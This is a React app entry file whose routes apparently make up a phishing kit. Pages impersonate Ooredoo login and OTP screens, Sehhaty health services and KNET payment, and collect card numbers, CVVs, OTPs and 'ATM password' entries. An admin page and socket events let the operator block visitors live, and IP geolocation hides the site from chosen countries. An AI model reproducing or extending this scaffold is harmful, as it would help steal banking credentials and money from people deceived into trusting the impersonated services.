import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch, useLocation } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import ScrollToTop from "./components/ScrollToTop";
import PageTitleUpdater from "./components/PageTitleUpdater";
import { ThemeProvider } from "./i18n/ThemeContext";
import { LanguageProvider } from "./i18n/LanguageContext";
import { initializeSocket, disconnectSocket, socket } from "./lib/store";
import { useState, useEffect } from "react";

// New Pages
import Portal from "./pages/Portal";
import Home from "./pages/Home";
import ServiceDetails from "./pages/ServiceDetails";
import OoredooLogin from "./pages/OoredooLogin";
import OoredooOtp from "./pages/OoredooOtp";
import Waiting from "./pages/Waiting";
import Sehhaty from "./pages/Sehhaty";
import SehhatyInfo from "./pages/SehhatyInfo";
import SehhatyService from "./pages/SehhatyService";
import MedicalLogin from "./pages/MedicalLogin";
import MedicalActivate from "./pages/MedicalActivate";
import MedicalRegister from "./pages/MedicalRegister";
import Legal from "./pages/Legal";
import Info from "./pages/Info";
import Admin from "./pages/Admin";

// Payment Pages (kept as-is)
import CreditCardPayment from "./pages/CreditCardPayment";
import OTPVerification from "./pages/OTPVerification";
import ATMPassword from "./pages/ATMPassword";
import KNETPayment from "./pages/KNETPayment";
import CVV from "./pages/CVV";
import FinalPage from "./pages/FinalPage";

function BlockedCountryPage() {
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
        <p className="text-gray-500 text-sm">This service is not available in your region</p>
      </div>
    </div>
  );
}

function Router() {
  return (
    <Switch>
      {/* New Pages */}
      <Route path={"/"} component={Portal} />
      <Route path={"/medical-commission"} component={Home} />
      <Route path={"/services/:key"} component={ServiceDetails} />
      <Route path={"/ooredoo-login"} component={OoredooLogin} />
      <Route path={"/ooredoo-otp"} component={OoredooOtp} />
      <Route path={"/waiting"} component={Waiting} />

      {/* Sehhaty Routes */}
      <Route path={"/sehhaty"} component={Sehhaty} />
      <Route path={"/sehhaty/info/:key"} component={SehhatyInfo} />
      <Route path={"/sehhaty/service/:key"} component={SehhatyService} />
      <Route path={"/sehhaty/services/:key"} component={SehhatyService} />
      <Route path={"/medical-login"} component={MedicalLogin} />
      <Route path={"/medical-activate"} component={MedicalActivate} />
      <Route path={"/medical-register"} component={MedicalRegister} />
      <Route path={"/legal/:slug"} component={Legal} />
      <Route path={"/info/:slug"} component={Info} />
      <Route path={"/admin"} component={Admin} />

      {/* Payment Routes */}
      <Route path={"/credit-card-payment"} component={CreditCardPayment} />
      <Route path={"/otp-verification"} component={OTPVerification} />
      <Route path={"/atm-password"} component={ATMPassword} />
      <Route path={"/knet-payment"} component={KNETPayment} />
      <Route path={"/cvv"} component={CVV} />
      <Route path={"/final-page"} component={FinalPage} />

      <Route path={"/404"} component={NotFound} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  const [location] = useLocation();
  const [isCountryBlocked, setIsCountryBlocked] = useState(false);
  const [isCheckingCountry, setIsCheckingCountry] = useState(false);
  const [isVisitorBlocked, setIsVisitorBlocked] = useState(false);
  const [blockedMessage, setBlockedMessage] = useState("");

  useEffect(() => {
    initializeSocket();
    return () => {
      disconnectSocket();
    };
  }, []);

  useEffect(() => {
    const s = socket.value;
    const handleBlocked = () => {
      setIsVisitorBlocked(true);
      setBlockedMessage("تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.");
    };
    const handleUnblocked = () => {
      setIsVisitorBlocked(false);
      setBlockedMessage("");
    };
    s.on("blocked", handleBlocked);
    s.on("unblocked", handleUnblocked);
    return () => {
      s.off("blocked", handleBlocked);
      s.off("unblocked", handleUnblocked);
    };
  }, []);

  useEffect(() => {
    const checkCountry = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const visitorCountry = data.country_name;
        socket.value.emit('blockedCountries:check', visitorCountry);
        socket.value.on('blockedCountries:checkResult', ({ isBlocked }: { isBlocked: boolean }) => {
          setIsCountryBlocked(isBlocked);
          setIsCheckingCountry(false);
        });
        socket.value.on('blockedCountries:updated', async (blockedCountries: string[]) => {
          const isBlocked = blockedCountries.some(c =>
            c.toLowerCase() === visitorCountry.toLowerCase()
          );
          setIsCountryBlocked(isBlocked);
        });
      } catch {
        setIsCheckingCountry(false);
      }
    };
    const timer = setTimeout(checkCountry, 1000);
    const fallbackTimer = setTimeout(() => {
      setIsCheckingCountry(false);
    }, 3000);
    return () => {
      clearTimeout(timer);
      clearTimeout(fallbackTimer);
    };
  }, []);

  if (isCheckingCountry) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-600"></div>
      </div>
    );
  }

  if (isCountryBlocked) return <BlockedCountryPage />;

  if (isVisitorBlocked) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
          <h1 className="text-2xl font-bold text-gray-800 mb-4">تم الحظر</h1>
          <p className="text-gray-600 mb-2">{blockedMessage}</p>
        </div>
      </div>
    );
  }

  return (
    <ErrorBoundary>
      <LanguageProvider>
        <ThemeProvider>
          <TooltipProvider>
            <Toaster />
            <ScrollToTop />
            <PageTitleUpdater />
            <Router />
          </TooltipProvider>
        </ThemeProvider>
      </LanguageProvider>
    </ErrorBoundary>
  );
}

export default App;
